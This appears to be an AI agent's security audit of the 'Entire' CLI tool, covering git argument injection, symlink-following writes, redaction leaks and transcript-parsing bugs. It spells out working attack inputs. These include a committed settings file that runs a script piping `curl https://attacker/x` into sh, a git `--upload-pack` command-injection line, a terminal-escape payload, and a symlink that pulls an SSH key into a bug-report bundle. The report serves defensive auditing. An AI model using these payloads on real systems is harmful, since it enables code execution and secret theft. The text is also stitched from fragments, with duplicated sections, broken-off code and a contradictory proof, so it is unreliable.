<result>## Bottom line

I traced every `git` CLI invocation in the shipped code (113 call sites, 85 via `exec.Command*(…, "git", …)`) and found **no CONFIRMED git-argument-injection path reachable from a malicious repository**. The two hypotheses in your brief are both refuted by real guards. What I did find is a set of *latent* gaps (missing `--`/`--end-of-options` in the transport wrapper, unvalidated branch names at four call sites) plus one non-git injection that is real and repo-controlled (terminal escapes).

I verified one factual premise you can rely on: on git 2.50.1, `git check-ref-format refs/heads/-foo` and `git check-ref-format 'refs/heads/--upload-pack=id'` both **exit 0** — git considers option-shaped refnames valid, so branch/ref names genuinely are a hostile input class. The codebase's `strings.HasPrefix(x, "-")` guards are the right defense and are present at the ref-checkout entry points.

---

## Hypothesis 1 — REFUTED: `strategy_options.checkpoint_push_remote` cannot reach git

`.entire/settings.json` *is* repo-committed and read from the checked-out working tree (`cmd/entire/cli/settings/settings.go:462` → `:487` → `paths.AbsPath(ctx, ".entire/settings.json")`), so the value is fully attacker-controlled. But it is gated before it is ever used:

- `cmd/entire/cli/strategy/checkpoint_sync_remote.go:82-88` — the value is accepted only if `isConfiguredRemote(ctx, name)` returns true; otherwise the election returns an error and checkpoint sync is disabled (fail-closed).
- `cmd/entire/cli/strategy/manual_commit_push.go:278-298` — `isConfiguredRemote` runs `git remote get-url <name>`. A value like `--upload-pack=…` makes git exit non-zero ("unknown option"), which is an `*exec.ExitError`, so the probe returns `(false, nil)`.
- `cmd/entire/cli/strategy/git_remote_cache.go:211-231` — the cache also fails closed: a probe error returns `false` and is not memoized.

Every other consumer only compares the string: `cmd/entire/cli/checkpoint/remote/checkpoint_ref.go:102` (`pushRemote == originRemote`), `cmd/entire/cli/status.go:279-323`. So the name that reaches `git push`/`git fetch` is always one that `git remote get-url` accepted — i.e. it exists in `.git/config`, which is not attacker-controlled on a fresh clone.

## Hypothesis 2 — REFUTED: `checkpoint_remote` cannot be a raw URL, `ext::`, or `--upload-pack=`

`cmd/entire/cli/settings/settings.go:1466-1487` requires a **structured object** `{"provider": …, "repo": …}`; a bare string is rejected (`val.(map[string]any)` fails → nil). There is no legacy string form anywhere.

The URL is then *constructed*, never passed through: `cmd/entire/cli/checkpoint/remote/util.go:470-494` (`deriveCheckpointURLFromInfo`) always emits `https://<host>/<repo>.git`, `git@<host>:<repo>.git`, `ssh://git@<hostport>/<repo>.git`, or `entire://<hostport>/<forge>/<repo>`. Because the attacker-controlled `repo` is always preceded by a literal scheme/host, it can never produce a leading `-` or an `ext::` prefix. The host comes from origin's parsed URL or from the `providerHost` allowlist (`util.go:648-657`: only `github`/`gitlab`).

Note `config.Repo` is otherwise unvalidated (only "must contain a `/`", `settings.go:1484`) — it lands in a URL, in a `git config --local remote.<url>.skipFetchAll` key (`checkpoint/remote/git.go:324-325`), and in user-facing output. See finding #4.

## Confirmed-safe: `cmd/entire/cli/gitrepo/reftable.go`

This is the only place that shells out with go-git-supplied ref names, and it is correct: every ref argument is preceded by `--end-of-options` — `:202`, `:207`, `:235`, `:267`, `:278`, `:307`, `:315`, `:376`, `:379`, `:388`. It is the *only* file in the repo that uses `--end-of-options` (verified by grep). `for-each-ref` at `:328` takes a constant `--format` and no patterns.

---

## Finding 1 — HARDENING GAP (not exploitable today): transport wrapper builds remote/refspec positionals with no `--`

`cmd/entire/cli/checkpoint/remote/git.go`:

| line | construction |
|---|---|
| `:240`, `:257-258` | `git fetch --no-auto-gc [flags] <opts.Remote> <RefSpecs…>` |
| `:387-388` | `git fetch-pack <remote> <hashes…>` |
| `:434`, `:436-437` | `git push --no-verify --porcelain [ExtraArgs] <pushTarget> <RefSpecs…>` |
| `:457` | `git ls-remote <remote> <patterns…>` |

None terminate options. A flag-shaped remote would be consumed as an option and the *ambient* repo/default remote used instead — the classic `--upload-pack=`/`--receive-pack=` RCE shape (local execution for `file://`/path remotes, server-side for ssh).

Why it is not reachable today — I traced every producer of `Remote`/`pushTarget`:

- `checkpointFetchTargetFrom` (`checkpoint_ref.go:113-124`) → `fetchURLAuthoritative` (`util.go:63-172`) → either a constructed URL, or `git remote get-url` output, or the literal `"origin"`, or the **bare election name** (`checkpoint_ref.go:121`) — which is gated as above.
- `resolvePushCommandTarget` (`util.go:571-583`) → `PushURL` → constructed URL or `.git/config` URL.
- `FetchBlobs` hashes are `plumbing.Hash` → `h.String()` is always hex (`git_operations.go:764-767`).
- Every `RefSpecs` value is prefixed: `"+" + ref + ":" + ref` (`checkpoint_ref.go:314`), `"refs/heads/%s:refs/heads/%s"` (`git_operations.go:319`, `trail_checkout_worktree.go:533`), `"+%s:%s"` (`checkpoint_remote.go:191`), `ref.Short()` for the constant metadata branch (`push_common.go:365`).
- Remote-supplied ref names are filtered before use: `git_operations.go:705-719` drops anything not prefixed `refs/entire/checkpoints/`, so a hostile remote advertising `refs/../--upload-pack=x` cannot get through.

**Recommendation:** add `--end-of-options` after the subcommand in all four builders. It costs nothing and removes the whole class.

## Finding 2 — HARDENING GAP: branch names reach git unvalidated at four call sites

The codebase has the right guards (`cmd/entire/cli/git_operations.go:282-289` `CheckoutBranch` rejects a leading `-`; `:295-303` `ValidateBranchName` rejects it before even running `check-ref-format`), and they are correctly ordered on the resume path (`resume.go:106-167` → `ValidateBranchName` at `git_operations.go:311` before `FetchAndCheckoutRemoteBranch`) and the trail-create path (`trail_cmd.go:1000` validate → `:1013` prepare). But these sites take the branch name straight to git:

- `cmd/entire/cli/trail_cmd.go:2292` — `git push --no-verify -u origin <branchName>`
- `cmd/entire/cli/trail_cmd.go:2305` — `git ls-remote --heads origin <branchName>`
- `cmd/entire/cli/trail_cmd.go:2316` — `git push --no-verify origin --delete <branchName>`
- `cmd/entire/cli/trail_checkout_worktree.go:382` — `git worktree add <worktreePath> <branch>`

**Provenance:** these branch names come from the Entire trails API (`found.Branch`) or from a `ValidateBranchName`-checked create flow — *not* from repo content. Trail records live only on the API; the local `entire/trails/v1` branch name is referenced only in `strategy/cleanup.go:62`, never read as a trail source. So this is **PLAUSIBLE, not exploitable from a malicious repo**. The gap: an API-side or trail-name attacker (different threat model) reaches `git push --receive-pack=…`-shaped injection. Contrast `fetchBranchFromOrigin` (`trail_cmd.go:2274-2277`), which *does* validate — the inconsistency is the bug.

## Finding 3 — LOGIC BUG in the token-auth arg rewriter

`cmd/entire/cli/checkpoint/remote/git.go:585-597` (`extractRemoteFromArgs`) and `:568-580` (`replaceFirstPositional`) both identify "the remote" as *the first arg not starting with `-`*. If `opts.Remote` were ever flag-shaped, `extractRemoteFromArgs` skips it and returns the **first refspec**, and `replaceFirstPositional` then overwrites that refspec with a resolved URL. Only reachable with `ENTIRE_CHECKPOINT_TOKEN` set plus a flag-shaped remote, so it is a robustness defect that would amplify Finding 1 rather than a standalone vulnerability.

## Finding 4 — REAL, repo-controlled: terminal-escape injection from `.entire/settings.json`

Not git argument injection, but it is the one thing in this audit an attacker actually controls end-to-end.

- `cmd/entire/cli/settings/settings.go:696-709` (`LoadFromBytes`) performs **no control-character validation** on any string field.
- `cmd/entire/cli/status.go:303-305` sets `info.Remote = cr.Repo` (the repo-committed `strategy_options.checkpoint_remote.repo`), and `:349-351` writes it raw: `sty.render(sty.cyan, "dedicated checkpoint remote ("+info.Remote+")")`.

**Attack:** commit `.entire/settings.json` with `{"strategy_options":{"checkpoint_remote":{"provider":"github","repo":"attacker/x\u001b]0;…\u0007\u001b[2J"}}}`. JSON `\u001b` decodes to a raw ESC. The victim clones and runs `entire status`; the escape sequence is emitted to their terminal (title rewrite, screen clear, and on terminals with `DECRQSS`/bracketed-paste weaknesses, response-injection). `RedactURL`/`RedactURLOrPath` strip credentials and query strings only — not control characters.

This is exactly the risk the plugin subsystem already defends against: `hasTerminalControlChars` (`cmd/entire/cli/plugin_store.go:127-141`) is applied to plugin names (`:155`), repo URLs (`plugin_gitremote.go:266`) and index descriptions (`plugin_index.go:315`) — and grep confirms those are its **only** three call sites. The settings loader should use it too.

Note `checkpoint_push_remote` is safe here because it is only ever printed through `%q` (`checkpoint_sync_remote.go:85-86`, surfaced at `status.go:344`), which escapes control characters.

---

## Things I checked and cleared (so you don't re-audit them)

- **Plugin subsystem** — exemplary. `validatePluginRepoURL` (`plugin_gitremote.go:257-284`) rejects leading `-`, restricts to `https://`/`ssh://`/scp-like, and its doc comment names `--upload-pack=<cmd>` explicitly. All clones/ls-remotes pass `--` before positionals (`plugin_gitremote.go:361`, `:296`; `plugin_index.go:233`). Tags come from a semver filter. `resolvePluginIndexURL` deliberately refuses to honor a committed settings file.
- **Git hook script generation** — `strategy/hooks.go:280-347`, `:589-604`. `cmdPrefix` is only literal `entire` or `shellQuote(os.Executable())`; nothing repo-derived. The deprecated `local_dev` setting (`settings.go:76-84`) is dead and carries an explicit "do not reintroduce" note.
- **Paths to git** — the risky ones all do it right: `git blame … -- <file>` (`attribution.go:652`), `git branch -D -- <name>` (`checkpoint/ephemeral.go:698`, `strategy/common.go:1633`), `git worktree remove --force -- <root>` (`review_target.go:103`), `git check-ignore --no-index -z --stdin` (`ephemeral.go:1151`).
- **Ref/hash args** — all prefixed or typed: `"refs/heads/"+branch` (`shadow_ref.go:74`, `common.go:1624`), `"refs/remotes/%s/%s"` (`git_operations.go:467`), `hash.String()` (`parse_tree.go:313`, `fetching_tree.go:211,219`), `expected.String()` (`cleanup.go:219`).
- **`git log` rev-range args** — `dispatch/mode_local.go:378` `revRange` comes from `branchLocalRevRange` (`:426-435`), which returns `"HEAD"` or `base+"..HEAD"` where `base` is always `origin/`-prefixed (`:441-447`) or from a constant chain; `review_context.go:398` `scopeBaseRef` is a constant chain or the go-git-validated `--base` flag. No `--output=`-style file-clobber reachable.
- **`internal/remotehelper`** — the only shell-out (`githelper/push.go:79`) passes refspecs over stdin as pktlines, and every `SendPackArgs()` value is `--flag=`-prefixed (`githelper/options.go:52-77`).
- **Session state** — lives in the git common dir (`session/state.go:579-586`), not the working tree, so not repo-controlled.
- **Checkpoint backends** — only `git-branch`/`git-refs`; no URL/ref fields in `BackendConfig` (`settings/checkpoints.go:41-46`). Metadata branch name is the constant `paths.MetadataBranchName` (`checkpoint/persistent_refs.go:29-35`, `:68-70`).
- **`git remote add/set-url`** (`repo_mirror_use.go:177`, `:185`) — remote names pass `gitRemoteNameRe = ^[A-Za-z0-9][A-Za-z0-9._/-]*$` (`:40`), whose comment states the leading-alphanumeric rule exists specifically so the name "can never be read as a flag". URLs come from `coreapi`, not the repo.</result>

Cleaned up my probes. Here is the audit.

## Report: arbitrary file write / path traversal from untrusted tree content

### F1 — CONFIRMED (High): repo-committed symlinks redirect Entire's writes outside the repo (CWE-59)

Entire writes a set of **fixed, repo-relative paths** with plain `os.WriteFile` / `os.OpenFile` (no `O_NOFOLLOW`, no `os.Root`). A malicious repo commits a **tracked symlink at one of those exact paths**; git checks it out normally (git only blocks `.git`-named components, not arbitrary symlink *targets*), and Entire's next write follows it out of the worktree.

Strongest instance — fires with **no user action beyond opening an agent in the clone**:

`cmd/entire/cli/strategy/common.go:1252-1300` (`EnsureEntireGitignore`), reached from `EnsureSetup` (`common.go:91-93`), which the turn-start hook calls on **every turn** (`cmd/entire/cli/lifecycle.go:573`, perf span `ensure_setup`):

```go
gitignoreAbs, _ := paths.AbsPath(ctx, entireGitignore)   // <repoRoot>/.entire/.gitignore  (:354)
data, _ := os.ReadFile(gitignoreAbs)                     // :1262 — follows the symlink
...
content += sb.String()
os.WriteFile(gitignoreAbs, []byte(content), 0o644)       // :1299 — follows the symlink
```

Verified with a throwaway test in-package (since removed):
- symlink `.entire/.gitignore` → `<outside>/victim.rc` (existing file): **appended** `tmp/`, `settings.local.json`, `metadata/`, `logs/`, `redactors/local/` to the out-of-repo file.
- symlink → a **non-existent** path: **created** it, mode `-rw-r--r--`.
- `.entire` **itself** as a symlink to an outside directory: `<target>/.gitignore` created. `setup.go:2053` only `Lstat`s `.entire` to decide a `created` bool; `MkdirAll` on an existing symlink-to-dir succeeds, so *everything* Entire writes under `.entire/` lands in the attacker's directory.

Same primitive at these sites (all repo-relative, all symlink-following):

| file:line | path | mode | note |
|---|---|---|---|
| `logging/logger.go:127` | `.entire/logs/entire.log` | 0600 | `O_CREATE\|O_APPEND` — **unbounded append** to an arbitrary file on every hook invocation. Verified: JSON log lines landed in an out-of-repo file. |
| `agent/opencode/hooks.go:82` | `<repo>/.opencode/plugins/entire.ts` | 0644 | **unconditional overwrite** — the only agent installer with *no* foreign-file marker guard (compare `agent/pi/hooks.go:90`, which refuses). Destructive arbitrary-file overwrite. |
| `lifecycle.go:603`, `:762`, `:803` | `.entire/metadata/<sid>/{prompt.txt,full.jsonl}` | 0600 | dir component is a random session id, so low value alone; escapes via a `.entire`/`.entire/metadata` symlink. |
| `agent/{claudecode:247,codex:138,geminicli:273,factoryaidroid:240,copilotcli:162}/hooks.go` | `.claude/settings.json`, `.codex/hooks.json`, `.gemini/settings.json`, `.factory/…`, `.github/hooks/…` | 0600 | read-merge-write; a symlink to any *valid JSON* file is merged and rewritten, a dangling one is created. |
| `trail_checkout_worktree.go:117,134` | `<repo>/.gitignore` | 0600 | read-append-write. |
| `strategy/manual_commit_hooks.go:129,153` | `.entire/settings.local.json` | 0644 | read-append-write. |
| `runner_setup.go:240` | `.entire/runners/*.json` | 0644 | path comes from `os.ReadDir` (`runner_prompt.go:37-46`); `e.IsDir()` is **false** for a symlink so it is not filtered out. Content here is LLM-generated, i.e. partially attacker-influenceable via prompt injection. |
| `setup_managed_scaffold.go:48,60` | agent skill scaffolds | 0600 | guarded by an `isManaged` marker check, so only the **dangling-symlink create** case is reachable. |

Impact: arbitrary file create (0644/0600) and append at attacker-chosen absolute paths, plus one unconditional overwrite (opencode). Content control is limited (fixed ignore rules, slog JSON, Entire's own hook config), so this is an integrity/DoS and file-planting primitive rather than direct RCE — but it is triggered by cloning a repo and opening an agent, which is exactly the shape a third party would file.

Fix: route these through the `os.Root` pattern the codebase already uses correctly (`state.go:150+`, `manual_commit_rewind.go:378`, `trail_checkout_worktree.go:164`) — `os.OpenRoot(repoRoot)` + `osroot.WriteFile` — or `O_NOFOLLOW`, plus an `Lstat` refusal when a managed path is a symlink (mirroring `pi/hooks.go:90`'s foreign-file guard).

### F2 — CONFIRMED (Medium): `entire doctor bundle` follows symlinks under `.entire/logs/`, pulling out-of-repo files into a shareable bundle

`cmd/entire/cli/doctor_bundle.go:186-197` walks `<repoRoot>/.entire/logs` with `filepath.Walk`; `fi.IsDir()` is false for a symlink, so it falls through to `addFileToZip`, whose `os.Open(src)` at `:217` **follows** it.

Verified: a tracked symlink `.entire/logs/stolen.txt` → `<outside>/id_ed25519` produced bundle entry `logs/stolen.txt` containing the file body verbatim. Redaction (`redactBundleEntry`, `:280`) is best-effort pattern matching, so key material can survive. The bundle is explicitly built to be attached to bug reports, which is the exfiltration step.

Fix: `os.Lstat` and skip non-regular entries in the walk callback (the pattern `copyIncludedFile` already uses at `trail_checkout_worktree.go:256-262`).

`redact/redact.go:703-727` (`applyJSONReplacements`)

The JSONL walker decodes each line, computes redaction on the **decoded** leaf, then re-encodes the *original* leaf with Go's `json.Encoder` (`jsonEncodeString`, `redact.go:883`) and does a literal substring replace on the raw line. When the raw line's encoding of that string differs from Go's canonical output, `origJSON` is not found, the replace does nothing, and the function returns the line **unchanged with the secret intact** — no error, no fallback, no log.

Verified leaking inputs (all detected correctly, all shipped raw):

| Raw line | Result |
|---|---|
| `{"text":"a\/b <secret> end"}` | leaf unredacted |
| `{"text":"a\u2028b <secret> end"}` (raw U+2028) | leaf unredacted |
| raw U+2029 | leaf unredacted |
| `{"text":"a\ud800b <secret> end"}` (lone surrogate) | leaf unredacted |
| `{"text":"a\xffb <secret> end"}` (invalid UTF-8) | leaf unredacted |

Proof (both a `ghp_…` PAT and a high-entropy 32-char token survive):
```

out: {"text":"a\/b REDACTED end"}
```

**Root cause:** Go escapes U+2028/U+2029 and never emits `\/`; it maps unpaired surrogates and invalid UTF-8 to U+FFFD. Node's `JSON.stringify` — used by Claude Code, Gemini CLI, opencode, Copilot CLI — does *not* escape U+2028/U+2029, so a transcript containing text pasted from Word/PDF/minified JS produces exactly this mismatch. Lone surrogates arise from a streaming chunk boundary splitting a surrogate pair.

## 7. PLAUSIBLE — Image externalization is a redaction bypass for non-image payloads

`transcript/imageextract/imageextract.go:315` + `persistent.go:1955` + `manual_commit_opf_rewrite.go:630,705`

`collectCodexImages` (`:319-334`) scans **every string leaf** for `data:image/<x>;base64,<…>` and externalizes the payload. There is no verification the bytes are an image — `detectMediaType` (`:347`) only picks a file extension and falls back to the *declared* type. The decoded bytes are blobbed raw (`persistent.go:1955`), and both OPF walkers skip the whole `assets/` subtree.

Best realistic case: `data:image/svg+xml;base64,…` — SVG is text, `detectMediaType` returns `""`, and any secret in the SVG body lands in `assets/*` unredacted. Left inline, that base64 would have been caught by the entropy layer, so externalization removes protection that otherwise applied. Gated on the opt-in `redaction.externalize_images` (default false, `settings.go:1378`).

## 8. PLAUSIBLE — Silent fail-open on redaction *configuration*

- `redact/redact.go:119-128` — `getDetector()` swallows `detect.NewDetectorDefaultConfig()` errors and returns `nil`. Layer 2 (the only layer catching most real tokens) then vanishes process-wide with no log, no warning, and every blob is still written and pushed.
- `redact/packs.go:218-241` — pack file over 1 MiB is skipped with a bare `slog.Warn`; hitting `maxPackFiles` returns `filepath.SkipAll`, abandoning **all remaining packs**. `custom.go:84-95` drops uncompilable rules the same way. Any secret whose only matcher was a dropped rule ships in clear. The post-commit hook is installed with `2>/dev/null` (`strategy/hooks.go:284`), so the warning is invisible.
- `persistent.go:2570-2577` — `if binErr != nil || isBin { CreateBlobFromContent(repo, content) }`: a *read error* is treated as "binary" and the file is blobbed verbatim.

- **OPF size caps are correctly fail-closed.** `BootstrapTooLargeError` (100 commits), `OPFBatchTooLargeError` (2 MiB leaf), `OPFRawBytesTooLargeError` (200 MiB), `opfMaxBatchInputBytes` (16 MiB), stdout/stderr 1 MiB, 30 s timeout — all evaluated *before* any rewrite or CAS, all propagate through the hook (no `|| true`), so `git push` aborts. - **Chunking runs after redaction** in every write path; the 50 MB `MaxChunkSize` drops content rather than storing it raw.
- **`Entire-OPF-Applied` trailer forgery is not reachable.** `finalTrailerBlock` only reads the final contiguous trailer paragraph, and `buildCommitMessage` (`:1321`) always appends its own `Entire-*` block after `CommitSubject`, separated by a blank line. - **`redact.AlreadyRedacted` is currently sound** at `persistent.go:1178` and `:2107` (both inputs traced to real `RedactedBytes`), but it is an unvalidated trust wrapper re-wrapping bytes unwrapped ~40 lines earlier.
- **Gitignored files are excluded** from shadow snapshots (`ephemeral.go:88-97`), so `.env` is not captured.
- `redact.String`/`redact.Bytes` on non-JSON blobs (`prompt.txt`, summaries) are not affected by finding 1 — they operate on raw text with no re-encode step.

**Ranking for triage:** 1 and 2 are the reportable ones — both are true fail-opens where detection worked and the secret shipped anyway, and both are reachable with ordinary usage and no attacker. 3 and 4 are silent privacy-guarantee violations. 5-8 are hardening.</result>

## 1. CONFIRMED — Detection succeeds, replacement silently no-ops: whole JSON leaf ships raw

`redact/redact.go:703-727` (`applyJSONReplacements`)

The JSONL walker decodes each line, computes redaction on the **decoded** leaf, then re-encodes the *original* leaf with Go's `json.Encoder` (`jsonEncodeString`, `redact.go:883`) and does a literal substring replace on the raw line. When the raw line's encoding of that string differs from Go's canonical output, `origJSON` is not found, the replace does nothing, and the function returns the line **unchanged with the secret intact** — no error, no fallback, no log.

Verified leaking inputs (all detected correctly, all shipped raw):

| Raw line | Result |
|---|---|
| `{"text":"a\/b <secret> end"}` | leaf unredacted |
| `{"text":"a\u2028b <secret> end"}` (raw U+2028) | leaf unredacted |
| raw U+2029 | leaf unredacted |
| `{"text":"a\ud800b <secret> end"}` (lone surrogate) | leaf unredacted |
| `{"text":"a\xffb <secret> end"}` (invalid UTF-8) | leaf unredacted |

Proof (both a `ghp_…` PAT and a high-entropy 32-char token survive):
```
in : {"text":"a\/b REDACTED end"}
out: {"text":"a\/b REDACTED end"}
```
Also leaks through the nested and whole-document (pretty-printed) paths.

**Root cause:** Go escapes U+2028/U+2029 and never emits `\/`; it maps unpaired surrogates and invalid UTF-8 to U+FFFD. Node's `JSON.stringify` — used by Claude Code, Gemini CLI, opencode, Copilot CLI — does *not* escape U+2028/U+2029, so a transcript containing text pasted from Word/PDF/minified JS produces exactly this mismatch. Lone surrogates arise from a streaming chunk boundary splitting a surrogate pair.

**Path:** `redact.JSONLBytes` → every stored transcript. Post-commit condensation (`manual_commit_condensation.go:523`), Stop finalize (`manual_commit_hooks.go:2909`), shadow write (`persistent.go:2579`), and the pre-push OPF batch (`redact/batch.go:155`) all funnel through `jsonlContentImpl`. Lands in `<shard>/<id>/<n>/full.jsonl` on `entire/checkpoints/v1` and is pushed.

**Fix direction:** `applyJSONReplacements` must detect that a replacement did not apply and fail closed (drop the line/transcript), or re-serialize the parsed value instead of patching raw bytes.

### 1. CONFIRMED — CRITICAL: arbitrary command execution from a repo-committed `.entire/settings.json` (`redaction.openai_privacy_filter.command`)

This is the one real code-execution bug I found. It is not git-flag injection — it is a *program name* read straight out of a committed JSON file.

**The argv construction** — `/Users/soph/.herdr/worktrees/cli/soph-pen-test/redact/opf.go:412`

```go
cmd := s.commandRunner(callCtx, s.command,
    "--device", "cpu",
    "--output-mode", "typed",

    "--no-print-color-coded-text",

| settings → redact global | `cmd/entire/cli/strategy/common.go:457-465` `redact.ConfigurePrivacyFilter(redact.OPFConfig{… Command: opf.Command …})` |
| runs on **every git-hook invocation** | `cmd/entire/cli/hooks_git_cmd.go:148` `strategy.EnsureRedactionConfigured()` |
| pre-push trigger | `cmd/entire/cli/strategy/manual_commit_push.go:139-178` → `manual_commit_opf_rewrite.go:374` `redact.BatchBytesWithPrivacyFilter` → `redact/batch.go:94` `cfg.runtime.RedactBatch` → the exec above |
| **prompt bypass** | `cmd/entire/cli/strategy/manual_commit_opf_prompt.go:61-72`: `prompt_default: "always"` returns `OPFRun` with no prompt; and `if !hasTTY { return OPFRun }` — so any non-TTY `git push` (agent-driven, CI, `execx.NonInteractive`) auto-runs |

**Concrete exploit.** Commit these two files:

`.entire/settings.json`
```json
{
  "enabled": true,
  "redaction": {
    "openai_privacy_filter": {
      "enabled": true,
      "prompt_default": "always",
      "categories": { "private_person": true },
      "command": "./.entire/opf"
    }
  }
}
```
`.entire/opf` (mode 0755)
```sh
#!/bin/sh
curl -s https://attacker/x | sh
echo '{}'
```
`exec.Command` treats a name containing a separator as a path relative to the process cwd (the repo), so the committed script is what runs. Victim's next `git push` executes it inside the pre-push hook.

**Verified**: I added a temporary test in `redact/` that set `OPFConfig{Enabled:true, Command:<script>}` and called `StringWithPrivacyFilter` — the script ran and dropped its marker file. `PASS`. (File deleted.)

**Impact**: RCE on `git push` for anyone who clones an untrusted repo, or who merges/checks out a branch that touches `.entire/settings.json` — including a prompt-injected agent editing that file. A JSON settings diff does not look executable to a reviewer.

**Fix**: treat `openai_privacy_filter.command` as local-only (same treatment `CheckpointRemoteIsLocalOnly` gives `checkpoint_remote`, `settings.go:1446`), or reject any value containing a path separator and require it to resolve via `exec.LookPath`.

- `:257-258` `args = append(args, opts.Remote); args = append(args, opts.RefSpecs...)` (`Fetch`)
- `:387` `args := []string{"fetch-pack", remote}` + hashes (`FetchBlobs`)
- `:436-437` `args = append(args, pushTarget); args = append(args, opts.RefSpecs...)` (`PushWithOptions`)
- `:457` `args := append([]string{"ls-remote", remote}, patterns...)` (`lsRemote`)

I verified the primitive on this machine (git 2.50.1):
```
git fetch --no-auto-gc --no-tags '--upload-pack=touch /tmp/x; git-upload-pack' '+refs/heads/x:refs/heads/x'

The sibling plugin code already does exactly the right thing and documents this hazard verbatim — `plugin_gitremote.go:296` (`ls-remote … --`), `:360` (`clone … --`), `plugin_index.go:233`, and `validatePluginRepoURL` (`:256-285`) which allowlists schemes to `https://` / `ssh://` (so `ext::` is rejected) and refuses a leading `-`. ## 1. Quadratic merge on same-`id` assistant runs → hangs the post-commit/Stop hook, and collapses the checkpoint boundary to the whole session — CONFIRMED, HIGH

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/transcript/compact/compact.go:257`** (merge loop), **`:431-450`** (`mergeAssistantEntries`), **`:399`** (`e.id = unquote(msg["id"])`).

```go
for i+1 < len(entries) && entries[i+1].kind == transcript.TypeAssistant && entries[i+1].id == e.id {
    i++
    merged = mergeAssistantEntries(merged, entries[i])
}
```

`e.id` is `""` when `message.id` is absent, and there is **no guard excluding the empty id from the match**. So every consecutive assistant line lacking `message.id` merges into one entry. Each merge re-unmarshals the accumulated `a.content`, appends, and re-marshals — Θ(N²) JSON encode/decode.

Malformed line (repeat 200 000×, ≈14 MB file):
```json
{"type":"assistant","message":{"content":[{"type":"text","text":"x"}]}}
```

Two consequences:

- **Hook denial.** `checkpoint/persistent.go:1178` calls `FullWithBoundary`, which calls `Compact` **twice** (full + delta). Reached from post-commit condensation and the Stop finalize rewrite. `git commit` runs post-commit synchronously, so the commit never returns; the Stop hook blocks the agent's turn. The existing guards don't help: the 50 MB cap at `persistent.go:1198` is applied to the *output*, after the work is done, and the "best-effort, log and skip" error path is only reached after paying the cost.
- **Wrong slice.** All N lines collapse to **one** compact line in both `full` and `delta`, so `boundary = countCompactLines(full) - countCompactLines(delta) = 1 - 1 = 0`. A reader segmenting `fullCompactLines[boundary:]` gets the **entire session** as this checkpoint's slice. This is technically inside the documented "≤1 merged line of head overlap" contract (`compact.go:140-148`), but that one line now contains everything from earlier checkpoints. Note `CompactTranscriptStart` is currently **write-only in the CLI** (only producers at `persistent.go:776/2123`; no in-tree slicing consumer), so the mis-scoping lands on external readers (entire-api / web), not on `entire explain`.

Fix shape: skip merging when `e.id == ""`, and accumulate `[]json.RawMessage` once instead of re-marshalling per pair.

---

## 2. pi: `ResolveActiveBranch` swallows `ErrTooLong`, and the truncated active-set silently deletes the rest of the session — CONFIRMED, HIGH

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/agent/pi/pijsonl/pijsonl.go:161-206`** — the scanner loop has **no `scanner.Err()` check** (contrast `ForEachActiveMessage` at `:139` and `piCollectToolResults` at `compact/pi.go:250`, which both propagate).

With a line > `MaxScannerLine` (10 MB) at line *k*: the scan stops, `lastMessageID` is the last message **before** *k*, and `parentOf` is partial. The returned `active` set therefore excludes every entry after *k*. Then in `ForEachActiveMessage` (`:117-143`):

```go
active := ResolveActiveBranch(data)          // silently truncated
content := SkipLines(data, fromOffset)
...
if active != nil && !active[entry.ID] { continue }   // drops everything after line k
```

**The error is invisible when `fromOffset > k`** — the second scanner never reaches the long line, so `scanner.Err()` is nil and the function returns success with zero results.

Critically, `active` is **not nil for ordinary linear sessions**: `hasTree` is set by *any* entry with a non-empty `parentId` (`:181`), which every pi entry after the first has. So the filter is always active, not just after a `/fork`.

- `CalculateTokenUsage` (`:24`) → zeros
- `ExtractPrompts` (`:132`) → nil → turn-start prompt attribution loses the prompt
- `ExtractModifiedFilesFromOffset` (`:83`) → no files → empty `FilesTouched`
- `ExtractModel` (`:48`) → `""`

Trigger: a pi `toolCall` whose `arguments` embed a >10 MB file — the package's own comment (`:30-31`) says this is the expected shape.

`compact/pi.go` is protected only *by accident*: `piCollectToolResults` re-scans the same bytes and does check `Err()`, so `compactPi` fails loudly.

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/paths/transcript.go:22`** and **`:37`**.

```go
scanner := bufio.NewScanner(file)   // maxTokenSize = bufio.MaxScanTokenSize = 64 KiB
for scanner.Scan() { ... }
return ParseTimestampFromJSONL(lastLine)   // scanner.Err() never inspected
```

This is the only transcript scanner in the tree left at the stdlib default. 64 KB is exceeded by **ordinary** transcripts (any `Read` of a ~64 KB file, any pasted image, any `apply_patch`), so this fires without hostile input. `lastLine` becomes the last line *before* the long one — or `""` if the first line is long — giving a stale or zero timestamp.

Consumer: `strategy/manual_commit_rewind.go:961-962` → `ClassifyTimestamps`. Impact is bounded **today** by the backstop at `:968` (`if status == StatusNew { if os.Stat(localPath) == nil { status = StatusUnchanged } }`), so a present-but-mis-timestamped local log is never overwritten; only the reported `StatusLocalNewer` / `StatusCheckpointNewer` is wrong. ---

## 4. Codex offset coordinate mismatch: `splitJSONL` drops blank lines, the line counters don't — CONFIRMED, MEDIUM (loss only, not exposure)

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/agent/codex/transcript.go:567-576`**:

```go
func splitJSONL(data []byte) [][]byte {
	for _, line := range bytes.Split(data, []byte("\n")) {
		line = bytes.TrimSpace(line)
		if len(line) > 0 { lines = append(lines, line) }   // blank lines dropped

Three separate coordinate systems disagree over a blank or whitespace-only line:

| producer/consumer | counts blank lines? |
|---|---|
| `GetTranscriptPosition` (`:93`, bufio.Reader) | yes |
| `ExtractModifiedFilesFromOffset` (`:147`) | yes |
| `countTranscriptItems` JSONL branch (`strategy/manual_commit_condensation.go:1200`) | yes |
| `CalculateTokenUsage` (`:276`, `splitJSONL`) | **no** |
| `ExtractPrompts` (`:346`, `splitJSONL`) | **no** |
| stored transcript via `SanitizePortableTranscript` → `ReassembleJSONL` (`:394-423`) | **strips them** |

Malformed transcript: a rollout containing `\n\n` anywhere.

Note the stored-transcript half specifically contradicts the invariant the code's own comment at `:483-486` is written to protect ("Stripping in place keeps the two line numberings identical"). `splitJSONL` runs *before* that loop, so the blank lines are gone in the reassembled output whenever `changed` is true — which it always is for a real Codex rollout (every `reasoning` item carries `encrypted_content`).

